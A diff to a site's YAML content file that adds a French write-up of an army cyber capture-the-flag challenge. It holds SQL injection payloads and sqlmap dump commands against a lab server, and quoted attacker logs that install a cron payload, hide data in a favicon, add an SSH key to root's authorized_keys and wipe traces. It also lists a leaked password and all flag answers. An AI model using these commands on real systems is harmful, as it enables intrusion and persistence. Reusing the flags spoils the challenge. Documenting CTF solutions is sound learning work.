@@ -15,16 +15,330 @@ article:
   contentBody: "<p class='mt-6'>
     Missions exceptionnelles, environnement hors du commun : venez découvrir les opérations militaires d'un sous-officier cyber.
     6 flags sont à trouver au total.
-    </p>
-    <p class='mt-8'>
-    Et vitae blandit facilisi magna lacus commodo. Vitae sapien duis odio id et. Id blandit molestie
-    auctor fermentum dignissim. Lacus diam tincidunt ac cursus in vel. Mauris varius vulputate et ultrices
-    hac adipiscing egestas. Iaculis convallis ac tempor et ut. Ac lorem vel integer orci.
     </p>"
   caption: "“Mettez vos compétences en cybersécurité au service de l'armée de Terre dans un challenge immersif organisé par le Commandement de la cyberdéfense.”"
   captionImage: "https://comcyber.challenges.pro.root-me.org/static/img/comcyber.png"
+  outlink: "https://comcyber.challenges.pro.root-me.org"
+  outlinkTitle: "Glissez-vous dans la peau d'un cybercombattant"
+
 #  stats:
 #    - { label: 'Score', value: '4/6' }
 #    - { label: 'Fun', value: '100%' }
-  outlink: "https://comcyber.challenges.pro.root-me.org"
-  outlinkTitle: "Glissez-vous dans la peau d'un cybercombattant"
+
+writeup: |+
+  # Write-up
+
+  Opérateur 10 à Cyberphantom. Prenez message :
+
+  Nous avons perdu la communication avec un véhicule alors que nous sommes en pleine opération.
+  Nous avons une suspicion de hacking. J'ai besoin de votre diagnostic afin de rétablir la communication avec le véhicule dans les plus brefs délais.
+  
+  Vous trouverez ici les derniers logs de communication entre la station radio et le véhicule. Ces informations devraient vous être utiles.
+  
+  Terminé.
+  
+  --------
+  
+  Cette premiere épreuve nous met à disposition un fichier [capture.pcap](./report/capture.pcap) (packet capture).
+  
+  ## Analyse du fichier capture.pcap
+  
+  En analysant ce fichier avec Wireshark, on peut parcourir la capture des packets réseaux.
+  
+  Une trame d'échange attire notre attention.
+  
+  ```log
+  Frame 83: 148 bytes on wire (1184 bits), 148 bytes captured (1184 bits) on interface any, id 0
+  
+  0000   00 04 00 01 00 06 02 42 0a 0a 00 fe 00 00 08 00   .......B........
+  0010   45 00 00 84 ec c4 40 00 40 06 5a d1 0a 0a 00 fe   E.....@.@.Z.....
+  0020   a3 ac 44 2a 9a 30 00 17 80 60 6c 5a 89 9a 4f 57   ..D*.0...`lZ..OW
+  0030   80 18 01 e9 f3 54 00 00 01 01 08 0a b3 12 b6 84   .....T..........
+  0040   b3 39 10 33 65 63 68 6f 20 55 6b 31 37 4e 32 46   .9.3echo Uk17N2F
+  0050   6d 5a 6a 4a 68 4e 6a 41 33 59 6a 45 7a 5a 6a 63   mZjJhNjA3YjEzZjc
+  0060   7a 59 32 49 77 4f 54 4d 32 5a 6a 6b 32 5a 54 59   zY2IwOTM2Zjk2ZTY
+  0070   33 59 6a 49 78 4d 44 49 77 4e 32 46 6c 4d 44 51   3YjIxMDIwN2FlMDQ
+  0080   33 4e 58 30 4b 20 3e 20 2f 74 6d 70 2f 73 65 63   3NX0K > /tmp/sec
+  0090   72 65 74 0a                                       ret.
+  ```
+  
+  Elle affiche l'utilisation d'une impression de caractères vers un fichier `/tmp/secret`.
+  
+  ```shell
+  echo Uk17N2FmZjJhNjA3YjEzZjczY2IwOTM2Zjk2ZTY3YjIxMDIwN2FlMDQ3NX0K > /tmp/secret
+  ```
+  
+  La chaine de caractère se révèle être une chaine encodée en base64, une fois décodée, nous trouvons notre premier flag.
+  
+  ```flag
+  RM{7aff2a607b13f73cb0936f96e67b210207ae0475}
+  ```
+  
+  Le reste de l'analyse du fichier capture.pcap, met en avant des actions pour se renseigner sur la configuration du serveur.
+  [Voir le fichier d'analyse](./report/🔍%20Telnet%20-%20Online%20pcap%20files%20viewer%20for%20analyze%20HTTP,%20DNS,%20other%20network%20traffic.pdf) (service gratuit utilisé, https://apackets.com)
+  
+  Le serveur a l'adresse IP suivante 163.172.68.42.
+  
+  Dans le fichier d'analyse des commandes exécutées, une ligne attire notre attention, une commande qui vise à savoir si le port 5000 est ouvert sur la machine.
+  
+  ```shell
+  netstat -nutelap | grep -i 5000
+  ```
+  
+  La commande n'ayant pas de sortie, nous pouvons en déduire que le port 5000 n'est pas ouvert.
+  
+  Qu'est-ce qui pouvait être recherché sur ce port ?
+
+  ## Investigation sur 163.172.68.42 (:5000)
+
+  Confirmons que le port 5000 n'est pas ouvert avec notre propre énumération des ports du serveur :
+
+  ```shell
+  nmap -Pn -sC -sV -O -oN initial
+  # on vise l'IP 163.172.68.42
+  ```
+  
+  Le résultat de l'analyse NMAP confirme que le port 5000 est ouvert et qu'il fournit un service HTTP.
+  
+  ```markdown
+  # NMAP partial output
+  PORT     STATE    SERVICE VERSION
+  5000/tcp open     http    nginx 1.22.1
+  ```
+  [Énumération complete](./report/inital.nmap)
+  
+  Lorsque l'on visite ce service http://163.172.68.42:5000, on découvre une page de login.
+  - nous sommes redirigé vers http://163.172.68.42:5000/login
+  - on notera qu'avec edge, on voit directement la page de login, avec d'autres navigateurs, il faut faire l'effort de supprimer des balises html pour voir la page de login (peut être une obfuscation volontaire ?)
+  
+  Un test rapide de ce formulaire met en evidence une injection SQL possible.
+  
+  ```markdown
+  username = admin
+  password = "' or 1=1 --"
+  ```
+  
+  On approfondit l'analyse avec SQLmap.
+  - ligne de commande a adapter, le template est [disponible ici](./report/login.template)
+  
+  ```shell
+  python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password
+  ```
+  
+  SQLmap confirme la possibilité d'injection SQL.
+  
+  ```log
+  [22:57:51] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
+  (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+  sqlmap identified the following injection point(s) with a total of 299 HTTP(s) requests:
+  ---
+  Parameter: #1* ((custom) POST)
+  Type: boolean-based blind
+  Title: OR boolean-based blind - WHERE or HAVING clause
+  Payload: username=test@test.com&password=-1571' OR 4147=4147-- sZBN
+  
+    Type: time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: username=test@test.com&password=2' OR 2625=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- hnWG
+  ---
+  [22:57:53] [INFO] the back-end DBMS is SQLite
+                      web application technology: Nginx 1.22.1
+                      back-end DBMS: SQLite
+  ```
+  
+  On recherche le nom des tables disponibles.
+  
+  ```shell
+  python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password --tables
+  ```
+  
+  On trouve la table `user`.
+  
+  ```log
+  [22:59:57] [INFO] retrieved: user
+  ```
+  
+  On tente d'exfiltrer les donnees de cette table.
+  
+  ```shell
+  python3 ../../../../sqlmap/sqlmap.py -v -r "login.template" --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=./sqlmap-login -p password --dump -T user
+  ```
+
+  On obtient le dump qui suit :
+
+  ```sql
+  id,password,username
+  NULL,RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5},admin
+  NULL,MEqvgJqr4W48U7L^eEaR!,alice
+  ```
+  
+  Cette exfiltration révèle un second flag
+  
+  ```flag
+  RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5}
+  ```
+  
+  Bien qu'on puisse déjà se loguer avec l'injection SQL admin et comme password `"' or 1=1 --"`, nous avons maintenant un identifiant valide.
+  - alice / `MEqvgJqr4W48U7L^eEaR!`
+
+  ## Goliath
+
+  Une fois logué, nous arrivons sur cette interface :
+
+  ![Goliath](./report/Dashboard%20-%20Personnel%20–%20Microsoft_%20Edge%2004_09_2024 12_54_31.png)
+  
+  On remarque une liste de vehicule.
+  Une fois un vehicule selectionne, des informations sur le vehicule apparaissent.
+  
+  Pour le véhicule GOLIATH, ces informations semblent indisponibles et une zone de contenu avec un bouton permet de récupérer des logs.
+  [Le fichier de logs](./report/server.log)
+  
+  > On trouve dans cette meme zone de contenu un bouton "ENABLE COMMUNICATION", qui ouvre une popin avec une identification ; Le formulaire n'a pas eu l'air d'etre exploitable.
+  
+  ![Goliath](./report/Dashboard%20-%20Personnel%20–%20Microsoft​%20Edge%2026_09_2024%2017_50_46.png)
+  
+  Apres investigation, le fichier révèle une commande avec une chaine de caractères encodée en hexadecimal qui doit être ajoutée à la crontab du serveur.
+  
+  ```log
+  Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo '2a202a202a202a202a20206563686f2027524d7b393835336561303861623734373265653865663237633631363239396461663530653330626439307d270a' | xxd -r -p | crontab -) [0]
+  ```
+  
+  Une fois décodé, on obtient un nouveau flag.
+  
+  ```markdown
+  * * * * * echo 'RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}'
+  ```
+  
+  ```flag
+  RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}
+  ```
+  
+  ## favicon.ico
+  
+  En poursuivant l'analyse de ces logs, on trouve une autre commande qui semble être une tentative de recuperation d'un fichier.
+  
+  ```log
+  Aug 27 12:25:02 COMCYBER_SRV root[250822]: CMD(echo 'efa3fb1f409aa622dddd7220ad6567580fb68b68' > /tmp/.password) [0]
+  Aug 27 12:33:56 COMCYBER_SRV root[250822]: CMD(zip --password $(cat /tmp/.password) secret.zip message.txt m4lw3r3) [0]
+  Aug 27 12:38:48 COMCYBER_SRV root[250822]: CMD(cat /app/static/assets/images/favicon.ico ./secret.zip > /app/static/assets/images/favicon.ico) [0]
+  ```
+  
+  Le pirate a tenté de cacher des informations dans le fichier `favicon.ico`.
+  - un fichier message.txt
+  - un fichier m4lw3r3
+
+  Le fichier `favicon.ico` a été exfiltré via le lien http://163.172.68.42:5000/static/assets/images/favicon.ico.
+  
+  Analysons ce fichier.
+  Avec les logs precedents, nous savons que le mot de passe du fichier zip est `efa3fb1f409aa622dddd7220ad6567580fb68b68`.
+  
+  ```shell
+  unzip favicon.ico
+  cat -e message.txt
+  ```
+  
+  Le fichier message.txt contient un nouveau flag.
+  
+  ```flag
+  RM{6ba43cb5eeab217270e9692e939da5341a82d2ff}
+  ```
+  
+  ```markdown
+  /!\
+  /!\ On notera que le hacker a laissé sa clef SSH sur la machine avant de supprimer ses traces.
+  /!\ -> A SUPPRIMER DONC
+  /!\
+  ```
+  
+  ```log
+  Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo 'ssh-rsa AAAAB3NzKV0CWVq3ngl2ThMYDfPehFMEBggHMwQsFqGYirCYEt+XOQWs5wHEZzhDTRfIR29Vgi3UqWOZ2+ddwq5xmcSMwk6BY+sZVRwxuSvNKXnz0jfrz667poinUJD8LRDAiBujt0fbyNpb8aKqAQxPwvRkWIRuktfZk9vs3zjzFYhQRIhn7geAPFCywOfBJVkUfD9mfYow9pihhKnXSvEB/z81edCzXerGxUQ1ztFXZsZmaS5Th1fPF3Vq0dz7kDNo95TP64qO6NY8PS5vbFgw0bppOlK8a8lNw04Zco7iNKtI90+UAfkgookBcG/TkhMcnqk9YTpt+qli1dD7RcxbNBsJBvWDxQYSsBDYsJsBr36TaVpewxWkiPjfTpsvLJGC7SFNX13msjgOFgzzWlMKUrYvsEqprBr6h3cI30Ql1o5HpbL/M04i9UPf+KpvY5PUBX94QbrOFthV/K1gpi/thkBhFqooT9/tnQiIxw== kali@attacker' >> /root/.ssh/authorized_keys) [0]
+  Aug 27 12:38:58 COMCYBER_SRV root[250822]: CMD(rm -rf ./message.txt ./secret.zip ./m4lw3r3) [0]
+  Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(rm -rf /tmp/.password) [0]
+  Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null) [0]
+  Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(rm -rf /tmp/hack) [0]
+  ```
+  
+  ## m4lw3r3
+  
+  Le fichier m4lw3r3 est un fichier binaire (`ELF 64-bit GNU/Linux 3.2.0`).
+  Nous pouvons l'exécuter sur une machine dédiée et sécurisée pour voir ce qu'il fait.
+  
+  L'outil https://any.run/ ne révèle pas d'action malveillante (pas d'activité sur le réseau, pas de modification de fichier, pas de modification de registre).
+  [L'outil https://www.hybrid-analysis.com ne révèle rien non plus](./report/Free%20Automated%20Malware%20Analysis%20Service%20-%20powered%20by%20Falcon%20Sandbox.pdf)
+  
+  Apres la mise en place d'une sandbox Linux/Kali, on peut exécuter le fichier librement.
+  
+  ```shell
+  ./m4lw3r3
+  ./m4lw3r3 input1 input2
+  ```
+  
+  La sortie d'exécution est standard et présente qu'il faut renseigner deux paramètres au binaire.
+  
+  Une veine tentative de désassemblage/debug avec GDB n'a rien donnee, le binaire ne semble pas avoir les flags de compilation nécessaire.
+  
+  On continue l'analyse du binaire avec [IDA Free](https://hex-rays.com/ida-free/) qui présente une cartographie complète du fonctionnement du binaire.
+  
+  ![input 1](./report/IDA-capture1-flag-input1-Capture d’écran 2024-09-25 à 22.33.48.png)
+  
+  Un premier flag, à peine masque, est découvert.
+  
+  ```flag
+  RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7}
+  ```
+  
+  Lors d'une nouvelle execution, le binaire confirme le premier argument
+  
+  ```
+  ./m4lw3r3 RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7} input2
+  ```
+  
+  ## Input2, OpenSSL ?
+  
+  Malheureusement, je n'ai pas trop perseveré sur le dernier flag, faute de temps et de compétence.
+  
+  Néanmoins, une piste s'est dégagé au fil de l'analyse.
+  
+  De ce qui est indiqué par mon stagiaire (ChatGPT) sur l'analyse de l'assembleur du binaire `m4lw3r3`, l'input2 ferait 128 caractères (en octets ? en bytes ?).
+  De ce que je comprends de la suite de l'épreuve est : que l'on doit trouver ce dernier paramètre, généré et/ou confirmé par un algorithme (OpenSSL ? RSA ?).
+
+  Ces paramètres doivent ensuite permettre de déchiffrer la chaine qui suit, comme révèle dans le binaire, s'agit-il du dernier flag ?
+  
+  ```log
+  puts(
+  "You should be able to decrypt this: 0x39c463428c629ce94df5bc1cb17bec86cb2231203a5270c598173f31415ff710696318"
+  "d9e889e1c891728fed2ed14a291a5b3b76e217d6f3bf24bd484b71f08843b4f3cbb30a5d480cf4e34339c5e06acc76574cfbea08a4fc"
+  "a2c73388b4e08831f8e037489092346809d7c164ab270a5e04ae40a327c99590da89025ac48aa5"
+  );
+  
+  // 0x39c463428c629ce94df5bc1cb17bec86cb2231203a5270c598173f31415ff710696318d9e889e1c891728fed2ed14a291a5b3b76e217d6f3bf24bd484b71f08843b4f3cbb30a5d480cf4e34339c5e06acc76574cfbea08a4fca2c73388b4e08831f8e037489092346809d7c164ab270a5e04ae40a327c99590da89025ac48aa5
+  ```
+  
+  ![hexa m4lw3r3](./report/hexa%20-%20m4lw3r3%2026_09_2024%2014_21_56.png)
+  
+  Durant l'investigation, j'ai découvert l'outil en ligne https://dogbolt.org qui permet de désassembler en ligne avec plusieurs outils concurrents, mais complémentaires.
+  Deux (Dewolf et RetDec) m'ont permis d'émettre des hypothèses sur la résolution de ce dernier challenge.
+
+  Dewolf désassemble en C et RetDec en C++, j'aurais pu profiter des codes générés pour :
+    - renommer les variables et fonctions avec des noms claires pour éclaircir le contexte
+    - copier et compiler le code dans un environment de développement et debugger
+    - essayer de disposer le code dans le sens inverse d'exécution pour identifier les éléments manquants
+
+  Mais peut-être ai-je manqué ce dernier flag ailleurs...
+  
+  ## Conclusion
+  
+  Très sympa de réaliser ses challenges en condition réelle.
+  Cet exercice m'a permis de valider mes acquis suite à ma reprise des challenges sur [root-me.org](https://www.root-me.org/abenevaut?inc=score&lang=fr) et les CTFs FCSC, 404 CTF et https://star.hackademint.org.
+  
+  Je suis ravi qu'il n'y ait pas eu d'OSINT, le challenge aurait pu s'arrêter beaucoup plus tôt pour moi.
+  
+  Merci aux équipes qui ont organisé cet événement.
+  
+  ```flags
+  RM{7aff2a607b13f73cb0936f96e67b210207ae0475}
+  RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5}
+  RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}
+  RM{6ba43cb5eeab217270e9692e939da5341a82d2ff}
+  RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7}
+  ```
